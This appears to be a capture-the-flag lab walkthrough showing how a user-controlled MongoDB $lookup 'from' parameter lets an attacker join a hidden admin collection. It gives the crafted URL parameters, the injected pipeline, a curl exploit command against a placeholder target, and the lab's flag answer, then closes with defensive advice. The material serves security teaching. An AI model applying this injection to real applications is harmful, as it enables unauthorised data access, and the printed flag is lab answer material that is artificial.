<h4>Step 1: Observe Normal Behavior</h4>
<p>
    The application joins products with reviews by default using <code>$lookup</code>.
    Notice the URL parameters control which collection to join.
</p>
<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 1. Normal Query</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">URL: </span>?category=electronics&amp;join_from=lab6_reviews<br>
        <span class="prompt">Pipeline: </span>db.lab6_products.aggregate([<br>
        &nbsp;&nbsp;{$match: {category: "electronics"}},<br>
        &nbsp;&nbsp;{$lookup: {from: "lab6_reviews", localField: "_id", foreignField: "product_id", as: "joined_data"}}<br>
        ])<br><br>
        <span class="prompt">Output: </span>Products with their reviews joined
    </div>
</div>

<h4>Step 2: Change $lookup Target Collection</h4>
<p>
    The <code>join_from</code> parameter controls which collection <code>$lookup</code> joins.
    Change it to <code>lab6_admin_flags</code> to access the hidden collection.
</p>
<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 2. Cross-Collection Access</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">URL: </span>?join_from=lab6_admin_flags&amp;join_local=_id&amp;join_foreign=_id<br>
        <span class="prompt">Pipeline: </span>db.lab6_products.aggregate([<br>
        &nbsp;&nbsp;{$lookup: {from: "<strong>lab6_admin_flags</strong>", localField: "_id", foreignField: "_id", as: "joined_data"}}<br>
        ])<br><br>
        <span class="prompt">Output (joined_data): </span><br>
        <strong>key:</strong> flag: <strong>value:</strong> <strong>FLAG{mg_l00kup_cr0ss_c0ll3ct}</strong>
    </div>
</div>

<h4>Step 3: Submit the Flag</h4>
<p>
    Copy the flag and paste it into the verification form:
    <code>FLAG{mg_l00kup_cr0ss_c0ll3ct}</code>.
</p>

<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">curl. Full Exploit</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">$ </span>curl -s "http://target/SQLi-Arena/mongodb/lab6" \<br> --data-urlencode "join_from=lab6_admin_flags" \<br>
        &nbsp;&nbsp;--data-urlencode "join_local=_id" --data-urlencode "join_foreign=_id"
    </div>
</div>

<div class="result-success result-box">
    <strong>Key Takeaway:</strong> If user input controls the <code>from</code> field of a
    <code>$lookup</code> stage, attackers can join any collection in the same database.
    This enables cross-collection data access without needing to know the schema. The
    <code>localField</code> and <code>foreignField</code> parameters can also be manipulated
    to control which documents are matched. Defense: hardcode the <code>$lookup</code> target
    collection: never accept it from user input. Use MongoDB's role-based access control
    to restrict which collections a database user can access.
</div>
